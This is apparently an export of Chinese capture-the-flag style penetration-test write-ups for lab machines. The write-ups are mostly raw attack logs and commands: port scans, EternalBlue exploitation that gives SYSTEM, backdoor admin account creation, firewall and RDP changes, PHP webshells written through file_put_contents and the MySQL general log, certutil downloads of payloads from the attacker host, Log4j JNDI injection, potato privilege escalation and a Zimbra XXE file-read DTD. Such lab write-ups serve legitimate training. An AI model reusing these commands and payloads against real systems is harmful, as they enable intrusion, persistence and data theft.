[{"title":"pt-7","path":"/2025/07/21/pt-7/","content":"pt-7信息收集(base) Downloads fscan2 -h 10.0.0.15 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[539ms] 已选择服务扫描模式[539ms] 开始信息扫描[539ms] 最终有效主机数量: 1[539ms] 开始主机扫描[539ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[543ms] 有效端口数量: 65535[606ms] [*] 端口开放 10.0.0.15:445[621ms] [*] 端口开放 10.0.0.15:464[646ms] [*] 端口开放 10.0.0.15:135[653ms] [*] 端口开放 10.0.0.15:139[738ms] [*] 端口开放 10.0.0.15:444[765ms] [*] 端口开放 10.0.0.15:25[775ms] [*] 端口开放 10.0.0.15:389[776ms] [*] 端口开放 10.0.0.15:80[778ms] [*] 端口开放 10.0.0.15:81[800ms] [*] 端口开放 10.0.0.15:88[815ms] [*] 端口开放 10.0.0.15:443[848ms] [*] 端口开放 10.0.0.15:593[850ms] [*] 端口开放 10.0.0.15:587[3.7s] [*] 端口开放 10.0.0.15:717[3.7s] [*] 端口开放 10.0.0.15:808[3.7s] [*] 端口开放 10.0.0.15:636[3.8s] [*] 端口开放 10.0.0.15:890[6.9s] [*] 端口开放 10.0.0.15:1801[9.7s] [*] 端口开放 10.0.0.15:2103[9.7s] [*] 端口开放 10.0.0.15:2105[9.7s] [*] 端口开放 10.0.0.15:2107[15.7s] [*] 端口开放 10.0.0.15:3268[15.7s] [*] 端口开放 10.0.0.15:3269[24.7s] [*] 端口开放 10.0.0.15:5062[26.7s] [*] 端口开放 10.0.0.15:5060[27.9s] [*] 端口开放 10.0.0.15:6001[30.8s] [*] 端口开放 10.0.0.15:6493[30.8s] [*] 端口开放 10.0.0.15:6495[30.8s] [*] 端口开放 10.0.0.15:6402[30.8s] [*] 端口开放 10.0.0.15:6403[30.8s] [*] 端口开放 10.0.0.15:6405[30.8s] [*] 端口开放 10.0.0.15:6428[30.8s] [*] 端口开放 10.0.0.15:6504[30.8s] [*] 端口开放 10.0.0.15:6505[30.8s] [*] 端口开放 10.0.0.15:6415[30.8s] [*] 端口开放 10.0.0.15:6507[30.8s] [*] 端口开放 10.0.0.15:6468[30.8s] [*] 端口开放 10.0.0.15:6407[30.8s] [*] 端口开放 10.0.0.15:6546[30.8s] [*] 端口开放 10.0.0.15:6511[30.8s] [*] 端口开放 10.0.0.15:6530[30.8s] [*] 端口开放 10.0.0.15:6513[30.8s] [*] 端口开放 10.0.0.15:6515[30.8s] [*] 端口开放 10.0.0.15:6534[30.8s] [*] 端口开放 10.0.0.15:6406[30.8s] [*] 端口开放 10.0.0.15:6557[30.9s] [*] 端口开放 10.0.0.15:6400[30.9s] [*] 端口开放 10.0.0.15:6455[30.9s] [*] 端口开放 10.0.0.15:6410[30.9s] [*] 端口开放 10.0.0.15:6401[30.9s] [*] 端口开放 10.0.0.15:6581[30.9s] [*] 端口开放 10.0.0.15:6585[30.9s] [*] 端口开放 10.0.0.15:6603[30.9s] [*] 端口开放 10.0.0.15:6614[39.8s] [*] 端口开放 10.0.0.15:8172[45.8s] [*] 端口开放 10.0.0.15:9389[48.7s] [*] 端口开放 10.0.0.15:9710[5m21s] [*] 端口开放 10.0.0.15:64327[5m21s] [*] 端口开放 10.0.0.15:64337[5m30s] 扫描完成, 发现 59 个开放端口[5m30s] 存活端口数量: 59[5m30s] 开始漏洞扫描[5m30s] POC加载完成: 总共387个，成功387个，失败0个[5m30s] [*] NetInfo 扫描结果目标主机: 10.0.0.15主机名: WIN-3UO9KLE0PIS发现的网络接口: IPv4地址: └─ 10.0.0.15[5m30s] [+] 发现漏洞 10.0.0.15 [Windows Server 2016 Standard 14393] MS17-010[5m30s] [+] SMTP服务 10.0.0.15:25 允许匿名访问[5m31s] [*] 网站标题 http://10.0.0.15:81 状态码:403 长度:1157 标题:403 - 禁止访问: 访问被拒绝。[5m31s] [*] 网站标题 http://10.0.0.15 状态码:403 长度:0 标题:无标题[5m31s] [*] 网站标题 https://10.0.0.15 状态码:500 长度:3367 标题:运行时错误[5m35s] [*] 网站标题 https://10.0.0.15:8172 状态码:404 长度:0 标题:无标题 发现MS17-010 MS17-010msf6 exploit(windows/smb/ms17_010_eternalblue) use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND whoamiCOMMAND = whoamimsf6 auxiliary(admin/smb/ms17_010_command) set RHOSTS 10.0.0.15RHOSTS = 10.0.0.15msf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for whoami:nt authority\\system[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 发现是system权限，直接远程桌面上去 msf6 auxiliary(admin/smb/ms17_010_command) set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fCOMMAND = REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net user cc Admin@123 /addCOMMAND = net user cc Admin@123 /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for net user cc Admin@123 /add:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net localgroup Administrators cc /addCOMMAND = net localgroup Administrators cc /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for net localgroup Administrators cc /add:����ɹ���ɡ�[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND netsh firewall set opmode disableCOMMAND = netsh firewall set opmode disablemsf6 auxiliary(admin/smb/ms17_010_command) run[*] 10.0.0.15:445 - Target OS: Windows Server 2016 Standard 14393[*] 10.0.0.15:445 - Built a write-what-where primitive...[+] 10.0.0.15:445 - Overwrite complete... SYSTEM session obtained![+] 10.0.0.15:445 - Service start timed out, OK if running a command or non-service executable...[*] 10.0.0.15:445 - Getting the command output...[*] 10.0.0.15:445 - Executing cleanup...[+] 10.0.0.15:445 - Cleanup was successful[+] 10.0.0.15:445 - Command completed successfully![*] 10.0.0.15:445 - Output for netsh firewall set opmode disable:��Ҫ��Ϣ: �ѳɹ�ִ����������޳�ʹ�� netsh firewall����Ӧ��ʹ�� netsh advfirewall firewall���й�ʹ�� netsh advfirewall firewall ������� netsh firewall ����ϸ��Ϣ�������http://go.microsoft.com/fwlink/?linkid=121488�ϵ� KB ���� 947709��ȷ����[*] 10.0.0.15:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed","tags":["MS17-010"]},{"title":"pt-8","path":"/2025/07/21/pt-8/","content":"pt-8信息收集(base) Downloads fscan2 -h 10.0.0.17 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[560ms] 已选择服务扫描模式[560ms] 开始信息扫描[560ms] 最终有效主机数量: 1[560ms] 开始主机扫描[560ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[564ms] 有效端口数量: 65535[642ms] [*] 端口开放 10.0.0.17:135[646ms] [*] 端口开放 10.0.0.17:139[815ms] [*] 端口开放 10.0.0.17:445[3.2s] [*] 端口开放 10.0.0.17:5357[23.4s] [*] 端口开放 10.0.0.17:49152[23.4s] [*] 端口开放 10.0.0.17:49153[23.4s] [*] 端口开放 10.0.0.17:49154[23.4s] [*] 端口开放 10.0.0.17:49155[23.4s] [*] 端口开放 10.0.0.17:49156[23.4s] [*] 端口开放 10.0.0.17:49157[30.8s] 扫描完成, 发现 10 个开放端口[30.8s] 存活端口数量: 10[30.8s] 开始漏洞扫描[30.9s] [*] NetInfo 扫描结果目标主机: 10.0.0.17主机名: cslab-PC发现的网络接口: IPv4地址: └─ 10.0.0.17[31.0s] [+] 发现漏洞 10.0.0.17 [Windows 7 Professional 7600] MS17-010[33.8s] 扫描已完成: 6/6 ms17-010msf6 exploit(windows/smb/ms17_010_psexec) use exploit/windows/smb/ms17_010_eternalblue[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcpmsf6 exploit(windows/smb/ms17_010_eternalblue) set payload windows/x64/meterpreter/bind_tcp_uuidpayload = windows/x64/meterpreter/bind_tcp_uuidmsf6 exploit(windows/smb/ms17_010_eternalblue) set RHOSTS 10.0.0.17RHOSTS = 10.0.0.17msf6 exploit(windows/smb/ms17_010_eternalblue) run[*] 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check[+] 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)[*] 10.0.0.17:445 - Scanned 1 of 1 hosts (100% complete)[+] 10.0.0.17:445 - The target is vulnerable.[*] 10.0.0.17:445 - Connecting to target for exploitation.[+] 10.0.0.17:445 - Connection established for exploitation.[+] 10.0.0.17:445 - Target OS selected valid for OS indicated by SMB reply[*] 10.0.0.17:445 - CORE raw buffer dump (27 bytes)[*] 10.0.0.17:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes[*] 10.0.0.17:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 30 sional 7600[+] 10.0.0.17:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 10.0.0.17:445 - Trying exploit with 12 Groom Allocations.[*] 10.0.0.17:445 - Sending all but last fragment of exploit packet[*] 10.0.0.17:445 - Starting non-paged pool grooming[+] 10.0.0.17:445 - Sending SMBv2 buffers[+] 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 10.0.0.17:445 - Sending final SMBv2 buffers.[*] 10.0.0.17:445 - Sending last fragment of exploit packet![*] 10.0.0.17:445 - Receiving response from exploit packet[+] 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 10.0.0.17:445 - Sending egg to corrupted connection.[*] 10.0.0.17:445 - Triggering free of corrupted buffer.[*] Started bind TCP handler against 10.0.0.17:4444[*] Sending stage (203846 bytes) to 10.0.0.17[*] Meterpreter session 1 opened (172.16.233.2:65092 - 10.0.0.17:4444) at 2025-07-21 09:38:49 +0800[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 10.0.0.17:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=meterpreter shellProcess 1756 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��C:\\Windows\\system32whoamiwhoamint authority\\system 获得system权限","tags":["MS17-010"]},{"title":"pt-2","path":"/2025/07/18/pt-2/","content":"pt-2信息收集192.168.1.233:22 open192.168.1.11:80 open192.168.1.11:135 open192.168.1.11:139 open192.168.1.11:445 open192.168.1.11:3306 open192.168.1.233:8080 open 发现首页是CMS YzmCMS远程代码执行 执行命令 out_trade_no[0]=eqout_trade_no[1]=whoamiout_trade_no[2]=system 发现360，上传会失败,用certutil certutil.exe -urlcache -split -f http://172.16.233.2:8883/fenli.exe C:/WWW/fenli.execertutil.exe -urlcache -split -f http://172.16.233.2:8883/360.ini C:/WWW/360.ini juicypotato提权 86b77ea99f51f8cc5006a96a7d75df01","tags":["YzmCMS","juicypotato提权"]},{"title":"pt-3","path":"/2025/07/18/pt-3/","content":"pt-3eyoucms这里直接弱口令 cyberstrikelab/123456 进后台 ?=file_put_contents(./uploads/ass.php,base64_decode(PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==)); badpotato提权上线cs发现badpotato能提权，直接上线system","tags":["eyoucms","badpotato提权"]},{"title":"pt-4","path":"/2025/07/18/pt-4/","content":"pt-4 靶机ip: 10.0.0.3 攻击机ip: 172.16.233.2 dedecms(base) Downloads fscan -h 10.0.0.3 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.0.0.3:3306 open10.0.0.3:80 open10.0.0.3:139 open10.0.0.3:135 open10.0.0.3:445 open[*] alive ports len is: 5start vulscan[*] NetInfo[*]10.0.0.3 [-]WIN-CMET1BTTSGN [-]10.0.0.3[*] WebTitle http://10.0.0.3 code:200 len:24370 title:cyberstrikelab[+] InfoScan http://10.0.0.3 [CMS][+] PocScan http://10.0.0.3 poc-yaml-dedecms-carbuyaction-fileinclude 发现dedecms,查看版本http://10.0.0.3/data/admin/ver.txt返回20241028，比较新的版本 正面硬刚不行？那我侧面突破！对了，听说管理员桌面上有惊喜～ (base) dirsearch [master●●] dirsearch -u http://10.0.0.3/Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722Output: /Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/reports/http_10.0.0.3/_25-07-18_15-32-58.txtTarget: http://10.0.0.3/[15:32:58] Starting:[15:33:01] 403 - 211B - /%3f/[15:33:01] 403 - 215B - /%C0%AE%C0%AE%C0%AF[15:33:03] 403 - 210B - /%ff[15:33:12] 403 - 220B - /.ht_wsr.txt[15:33:13] 403 - 223B - /.htaccess.bak1[15:33:13] 403 - 223B - /.htaccess.save[15:33:13] 403 - 225B - /.htaccess.sample[15:33:13] 403 - 224B - /.htaccess_extra[15:33:13] 403 - 221B - /.htaccess_sc[15:33:13] 403 - 221B - /.htaccessOLD[15:33:13] 403 - 221B - /.htaccessBAK[15:33:13] 403 - 222B - /.htaccessOLD2[15:33:13] 403 - 214B - /.html[15:33:13] 403 - 223B - /.htaccess.orig[15:33:13] 403 - 223B - /.htaccess_orig[15:33:13] 403 - 213B - /.htm[15:33:13] 403 - 223B - /.htpasswd_test[15:33:13] 403 - 219B - /.htpasswds[15:33:13] 403 - 220B - /.httr-oauth[15:33:36] 301 - 226B - /A - http://10.0.0.3/A/[15:33:36] 301 - 226B - /a - http://10.0.0.3/a/[15:34:11] 301 - 231B - /assets - http://10.0.0.3/assets/[15:34:12] 200 - 316B - /assets/[15:34:29] 200 - 3B - /data/cache/[15:34:29] 301 - 229B - /data - http://10.0.0.3/data/[15:34:29] 200 - 2KB - /data/[15:34:29] 200 - 3B - /data/sessions/[15:34:43] 200 - 1KB - /favicon.ico[15:34:52] 301 - 231B - /images - http://10.0.0.3/images/[15:34:52] 200 - 796B - /images/[15:34:53] 301 - 232B - /include - http://10.0.0.3/include/[15:34:53] 200 - 5KB - /include/[15:34:54] 403 - 225B - /index.php::$DATA[15:34:54] 301 - 232B - /Install - http://10.0.0.3/Install/[15:34:54] 301 - 232B - /INSTALL - http://10.0.0.3/INSTALL/[15:34:54] 301 - 232B - /install - http://10.0.0.3/install/[15:34:55] 200 - 3B - /install/[15:35:02] 301 - 226B - /m - http://10.0.0.3/m/[15:35:06] 301 - 231B - /member - http://10.0.0.3/member/[15:35:06] 200 - 5KB - /member/[15:35:06] 200 - 5KB - /member/login.php[15:35:21] 301 - 235B - /phpmyadmin - http://10.0.0.3/phpmyadmin/[15:35:21] 301 - 235B - /phpMyAdmin - http://10.0.0.3/phpMyAdmin/[15:35:25] 200 - 2KB - /phpmyadmin/README[15:35:25] 200 - 32KB - /phpmyadmin/ChangeLog[15:35:27] 301 - 229B - /plus - http://10.0.0.3/plus/[15:35:28] 200 - 4KB - /phpmyadmin/index.php[15:35:28] 200 - 4KB - /phpMyAdmin/[15:35:28] 200 - 4KB - /phpmyadmin/[15:35:28] 200 - 4KB - /phpMyadmin/[15:35:28] 200 - 4KB - /phpMyAdmin/index.php[15:35:28] 200 - 4KB - /phpmyAdmin/[15:35:35] 200 - 505B - /robots.txt[15:35:41] 200 - 5KB - /shell.php[15:35:45] 301 - 232B - /special - http://10.0.0.3/special/[15:35:53] 200 - 4KB - /tags.php[15:35:53] 301 - 233B - /templets - http://10.0.0.3/templets/[15:35:57] 403 - 225B - /Trace.axd::$DATA[15:35:59] 200 - 3B - /uploads/[15:36:00] 301 - 232B - /uploads - http://10.0.0.3/uploads/[15:36:08] 403 - 226B - /web.config::$DATA phpmyadminphpmyadmin用户名密码为 root/cyberstrikelab 发现写不了文件，用日志写入木马shell show global variables like %general%;1.查看日志功能是否开启 show global variables like %general%2.未开启的话设置为 on set global general_log=ON3.开启后将日志文件的存储位置改为可访问到的目录， 根目录即可 set global general_log_file = C:/WWW/1.php4.执行下边一句话木马 数据库将会将查询语句保存在日志文件中 SELECT ?php $a=~+d()^!+;$b=$$a[a];eval(.$b);?5.写入成功后 使用蚁剑连接 发现是SYSTEM权限 administrator用户桌面上：右键桌面-个性化，背景选择“幻灯片放映” 上线抓hash登录Administrator，结果执行不了很奇怪，直接远程桌面上线抓 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fnet user cc Admin@123 /addnet localgroup Administrators cc /addnetsh firewall set opmode disable 发现是有windows defender，直接关掉就能上线","tags":["dedecms","phpmyadmin"]},{"title":"pt-5","path":"/2025/07/18/pt-5/","content":"pt-5信息收集(base) 2.0.1 ./FScan_2.0.1_mac_arm64 -h www.rel8989.cslab -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[557ms] 已选择服务扫描模式[557ms] 开始信息扫描[557ms] 最终有效主机数量: 1[557ms] 开始主机扫描[557ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[560ms] 有效端口数量: 65535[641ms] [*] 端口开放 www.rel8989.cslab:135[658ms] [*] 端口开放 www.rel8989.cslab:139[801ms] [*] 端口开放 www.rel8989.cslab:445[3.5s] [*] 端口开放 www.rel8989.cslab:5985[4.4s] [*] 端口开放 www.rel8989.cslab:8080[21.7s] [*] 端口开放 www.rel8989.cslab:47001[22.9s] [*] 端口开放 www.rel8989.cslab:49669[22.9s] [*] 端口开放 www.rel8989.cslab:49668[22.9s] [*] 端口开放 www.rel8989.cslab:49664[22.9s] [*] 端口开放 www.rel8989.cslab:49666[22.9s] [*] 端口开放 www.rel8989.cslab:49665[22.9s] [*] 端口开放 www.rel8989.cslab:49670[22.9s] [*] 端口开放 www.rel8989.cslab:49671[22.9s] [*] 端口开放 www.rel8989.cslab:49667[32.1s] 扫描完成, 发现 14 个开放端口[32.1s] 存活端口数量: 14[32.1s] 开始漏洞扫描[32.1s] POC加载完成: 总共387个，成功387个，失败0个[33.0s] [*] NetInfo 扫描结果目标主机: www.rel8989.cslab主机名: WIN-2PNAS7U283S发现的网络接口: IPv4地址: └─ 10.0.0.28[34.4s] [*] 网站标题 http://www.rel8989.cslab:8080 状态码:200 长度:22 标题:无标题[45.3s] 扫描已完成: 8/8 扫目录半天没找到看wp发现是目录/cslab (base) 2.0.1 curl http://www.rel8989.cslab:8080/cslab收到参数：null fuzz参数 (base) 2.0.1 arjun -u http://www.rel8989.cslab:8080/cslab _ /_| _ ( |/ /(//) v2.2.4 _/ Probing the target for stability Analysing HTTP response for anomalies Analysing HTTP response for potential parameter names Logicforcing the URL endpoint parameter detected: payload, based on: body length Parameters found: payload 发现参数是payload，因为本题提示是log4j，使用log4j参数测试 log4j(base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C certutil.exe -urlcache -split -f http://172.16.233.2:8889/fenli.exe fenli.exe -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] certutil.exe -urlcache -split -f http://172.16.233.2:8889/fenli.exe fenli.exe----------------------------JNDI Links----------------------------Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/fzf2vrTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/2mwfzsldap://172.16.233.2:1389/2mwfzsTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/6vyiiildap://172.16.233.2:1389/6vyiii----------------------------Server Log----------------------------2025-07-18 22:45:20 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:45:20 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:45:20 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:45:30 [RMISERVER] Have connection from /10.0.0.28:496822025-07-18 22:45:34 [RMISERVER] Reading message...2025-07-18 22:45:34 [RMISERVER] Is RMI.lookup call for fzf2vr 22025-07-18 22:45:34 [RMISERVER] Sending local classloading reference.2025-07-18 22:45:34 [RMISERVER] Closing connection (base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C certutil.exe -urlcache -split -f http://172.16.233.2:8889/360.ini 360.ini -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] certutil.exe -urlcache -split -f http://172.16.233.2:8889/360.ini 360.ini----------------------------JNDI Links----------------------------Target environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/jhsdukldap://172.16.233.2:1389/jhsdukTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/j7rznbTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/qrzb3uldap://172.16.233.2:1389/qrzb3u----------------------------Server Log----------------------------2025-07-18 22:47:24 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:47:24 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:47:25 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:47:35 [RMISERVER] Have connection from /10.0.0.28:496862025-07-18 22:47:35 [RMISERVER] Reading message...2025-07-18 22:47:35 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:47:35 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:47:35 [RMISERVER] Closing connection2025-07-18 22:48:24 [RMISERVER] Have connection from /10.0.0.28:496872025-07-18 22:48:24 [RMISERVER] Reading message...2025-07-18 22:48:24 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:24 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:24 [RMISERVER] Closing connection2025-07-18 22:48:38 [RMISERVER] Have connection from /10.0.0.28:496882025-07-18 22:48:38 [RMISERVER] Reading message...2025-07-18 22:48:38 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:38 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:38 [RMISERVER] Closing connection2025-07-18 22:48:48 [RMISERVER] Have connection from /10.0.0.28:496892025-07-18 22:48:48 [RMISERVER] Reading message...2025-07-18 22:48:48 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:48 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:48 [RMISERVER] Closing connection2025-07-18 22:48:59 [RMISERVER] Have connection from /10.0.0.28:496902025-07-18 22:48:59 [RMISERVER] Reading message...2025-07-18 22:48:59 [RMISERVER] Is RMI.lookup call for j7rznb 22025-07-18 22:48:59 [RMISERVER] Sending local classloading reference.2025-07-18 22:48:59 [RMISERVER] Closing connection (base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C fenli.exe 360.ini -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] fenli.exe 360.ini----------------------------JNDI Links----------------------------Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/hxmfdrTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/kb1lsgldap://172.16.233.2:1389/kb1lsgTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/lj1offldap://172.16.233.2:1389/lj1off----------------------------Server Log----------------------------2025-07-18 22:49:27 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:49:27 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:49:27 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:49:36 [RMISERVER] Have connection from /10.0.0.28:496932025-07-18 22:49:36 [RMISERVER] Reading message...2025-07-18 22:49:36 [RMISERVER] Is RMI.lookup call for hxmfdr 22025-07-18 22:49:36 [RMISERVER] Sending local classloading reference.2025-07-18 22:49:36 [RMISERVER] Closing connection 然后主机上线了，权限是Administrator","tags":["log4j"]},{"title":"pt-6","path":"/2025/07/18/pt-6/","content":"pt-6信息收集(base) zimbra_poc [master] cat EOF 1.dtdheredoc !ENTITY % file SYSTEM file:../conf/localconfig.xml!ENTITY % start ![CDATA[!ENTITY % end ]]!ENTITY % all !ENTITY fileContents %start;%file;%end;heredoc EOF(base) zimbra_poc [master●] p -m http.server 8889Serving HTTP on :: port 8889 (http://[::]:8889/) ... zimbra-rce使用https://github.com/fnmsd/zimbra_poc，修改里面代码 